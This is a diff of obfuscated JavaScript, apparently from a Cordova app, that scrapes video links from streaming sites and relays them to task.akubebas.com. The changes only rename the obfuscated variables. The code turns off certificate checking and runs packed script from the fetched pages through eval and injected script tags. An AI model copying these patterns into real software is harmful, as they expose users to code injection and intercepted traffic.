-							if (_0x49ced7.length > 2) {
-								for (var _0x31c691 = 1; _0x31c691 < _0x49ced7.length; _0x31c691++)
-									if (_0x5b77ad = "https://nonton" + _0x49ced7[_0x31c691].split('"')[0], -1 == _0x5b77ad.indexOf(".srt") && _0x5b77ad.indexOf("redirector") > -1) {
-										var _0x1b9d91 = setTimeout(function () {
-												ws && ws.send("failed|" + _0x1aab78 + "|" + _0x128b52 + "|iframe")
+							var _0x43bc14 = _0x390e7e.split("https://nonton"),
+							_0x207cb7 = "",
+							_0x3cf86c = "",
+							_0x4b7949 = "",
+							_0x50d542 = "";
+							if (_0x43bc14.length > 2) {
+								for (var _0x3128b8 = 1; _0x3128b8 < _0x43bc14.length; _0x3128b8++)
+									if (_0x50d542 = "https://nonton" + _0x43bc14[_0x3128b8].split('"')[0], -1 == _0x50d542.indexOf(".srt") && _0x50d542.indexOf("redirector") > -1) {
+										var _0x237421 = setTimeout(function () {
+												ws && ws.send("failed|" + _0x239469 + "|" + _0x211a31 + "|iframe")
 											}, 3e4);
-										cordovaHTTP.setHeader("referer", _0x452ec9),
-										cordovaHTTP.setHeader("user-agent", _0x1fb3a6),
+										cordovaHTTP.setHeader("referer", _0x978c89),
+										cordovaHTTP.setHeader("user-agent", _0x4615c8),
 										cordovaHTTP.acceptAllCerts(!0, function () {
-											cordovaHTTP.get(_0x5b77ad, {}, {}, function (_0x1dc281) {
-												if (_0x1b9d91) {
-													clearTimeout(_0x1b9d91);
-													var _0x4e2074 = _0x1dc281.data,
-													_0x23d745 = _0x4e2074.split('unescape("')[1].split('"')[0];
-													if (_0x23d745 = decodeURIComponent(_0x23d745), _0x23d745.indexOf("(p,a,c,k,e,d)") > -1) {
-														eval("var value=String(" + _0x23d745.split("eval(")[1].split("{}))")[0] + "{}))"),
+											cordovaHTTP.get(_0x50d542, {}, {}, function (_0x23960a) {
+												if (_0x237421) {
+													clearTimeout(_0x237421);
+													var _0x513855 = _0x23960a.data,
+													_0x42645d = _0x513855.split('unescape("')[1].split('"')[0];
+													if (_0x42645d = decodeURIComponent(_0x42645d), _0x42645d.indexOf("(p,a,c,k,e,d)") > -1) {
+														eval("var value=String(" + _0x42645d.split("eval(")[1].split("{}))")[0] + "{}))"),
 														$("head").append('<script id="eval">var unpacked = function(){' + value + "};<\/script>"),
 														$("#eval").remove();
-														var _0x578575 = String(unpacked);
-														_0x578575.indexOf("driveid=") > -1 ? (_0x65b827.sub = _0x578575.split('tracks:[{file:"')[1].split('"')[0], _0x65b827.drive = _0x578575.split("driveid=")[1].split("&")[0], _0x65b827.src = _0x578575.split("sources:")[1].split("}]")[0] + "}]", _0x65b827.srcfix = _0x65b827.src, _0x65b827.iframe = _0x5b77ad, $.ajax({
+														var _0x53c7ef = String(unpacked);
+														_0x53c7ef.indexOf("driveid=") > -1 ? (_0x2a51d8.sub = _0x53c7ef.split('tracks:[{file:"')[1].split('"')[0], _0x2a51d8.drive = _0x53c7ef.split("driveid=")[1].split("&")[0], _0x2a51d8.src = _0x53c7ef.split("sources:")[1].split("}]")[0] + "}]", _0x2a51d8.srcfix = _0x2a51d8.src, _0x2a51d8.iframe = _0x50d542, $.ajax({
 																url: "https://task.akubebas.com/source/ws/",
 																type: "POST",
 																cache: !0,
 																timeout: 3e4,
-																data: _0x65b827,
+																data: _0x2a51d8,
 																error: function () {
-																	ws && ws.send("failed|" + _0x1aab78 + "|" + _0x128b52 + "|postsource")
+																	ws && ws.send("failed|" + _0x239469 + "|" + _0x211a31 + "|postsource")
 																},
 																success: function (e) {
 																	(e = e.split("|")).shift(),
 																	e = e.join("|"),
 																	ws.send(e)
 																}
-															})) : ws && ws.send("unavailable|" + _0x1aab78 + "|" + _0x128b52)
+															})) : ws && ws.send("unavailable|" + _0x239469 + "|" + _0x211a31)
 													}
 												}
 											})
@@ -1402,45 +1457,45 @@ function getBoker(_0x65b827, _0x13851c) {
 										break
 									}
 							} else
-								ws && ws.send("unavailable|" + _0x1aab78 + "|" + _0x128b52)
+								ws && ws.send("unavailable|" + _0x239469 + "|" + _0x211a31)
 						}
 					else
-						ws && ws.send("notfound|" + _0x1aab78 + "|" + _0x128b52 + "|" + _0x452ec9 + "|" + _0x3666f0)
+						ws && ws.send("notfound|" + _0x239469 + "|" + _0x211a31 + "|" + _0x978c89 + "|" + _0x2f3977)
 				}
 			})
 		})
 	} else {
-		var _0x41e93a = setTimeout(function () {
-				ws && ws.send("failed|" + _0x1aab78 + "|" + _0x128b52 + "|iframe")
+		var _0x5d84d5 = setTimeout(function () {
+				ws && ws.send("failed|" + _0x239469 + "|" + _0x211a31 + "|iframe")
 			}, 3e4);
 		cordovaHTTP.setHeader("referer", "https://bioskopkeren.fun/"),
-		cordovaHTTP.setHeader("user-agent", _0x1fb3a6),
+		cordovaHTTP.setHeader("user-agent", _0x4615c8),
 		cordovaHTTP.acceptAllCerts(!0, function () {
-			cordovaHTTP.get(_0x452ec9, {}, {}, function (_0xb6540c) {
-				if (_0x41e93a) {
-					clearTimeout(_0x41e93a);
-					var _0x4c5dfd = _0xb6540c.data,
-					_0x5c8486 = _0x4c5dfd.split('unescape("')[1].split('"')[0];
-					if (_0x5c8486 = decodeURIComponent(_0x5c8486), _0x5c8486.indexOf("(p,a,c,k,e,d)") > -1) {
-						eval("var value=String(" + _0x5c8486.split("eval(")[1].split("{}))")[0] + "{}))"),
+			cordovaHTTP.get(_0x978c89, {}, {}, function (_0x2f8038) {
+				if (_0x5d84d5) {
+					clearTimeout(_0x5d84d5);
+					var _0x2278f9 = _0x2f8038.data,
+					_0x27ce59 = _0x2278f9.split('unescape("')[1].split('"')[0];
+					if (_0x27ce59 = decodeURIComponent(_0x27ce59), _0x27ce59.indexOf("(p,a,c,k,e,d)") > -1) {
+						eval("var value=String(" + _0x27ce59.split("eval(")[1].split("{}))")[0] + "{}))"),
 						$("head").append('<script id="eval">var unpacked = function(){' + value + "};<\/script>"),
 						$("#eval").remove();
-						var _0x59caa6 = String(unpacked);
-						_0x59caa6.indexOf("driveid=") > -1 ? (_0x65b827.sub = _0x59caa6.split('tracks:[{file:"')[1].split('"')[0], _0x65b827.drive = _0x59caa6.split("driveid=")[1].split("&")[0], _0x65b827.src = _0x59caa6.split("sources:")[1].split("}]")[0] + "}]", _0x65b827.srcfix = _0x65b827.src, _0x65b827.iframe = _0x452ec9, $.ajax({
+						var _0x14d985 = String(unpacked);
+						_0x14d985.indexOf("driveid=") > -1 ? (_0x2a51d8.sub = _0x14d985.split('tracks:[{file:"')[1].split('"')[0], _0x2a51d8.drive = _0x14d985.split("driveid=")[1].split("&")[0], _0x2a51d8.src = _0x14d985.split("sources:")[1].split("}]")[0] + "}]", _0x2a51d8.srcfix = _0x2a51d8.src, _0x2a51d8.iframe = _0x978c89, $.ajax({
 								url: "https://task.akubebas.com/source/ws/",
 								type: "POST",
 								cache: !0,
 								timeout: 3e4,
-								data: _0x65b827,
+								data: _0x2a51d8,
 								error: function () {
-									ws && ws.send("failed|" + _0x1aab78 + "|" + _0x128b52 + "|postsource")
+									ws && ws.send("failed|" + _0x239469 + "|" + _0x211a31 + "|postsource")
 								},
 								success: function (e) {
 									(e = e.split("|")).shift(),
 									e = e.join("|"),
 									ws.send(e)
 								}
-							})) : ws && ws.send("unavailable|" + _0x1aab78 + "|" + _0x128b52)
+							})) : ws && ws.send("unavailable|" + _0x239469 + "|" + _0x211a31)
 					}
 				}
 			})
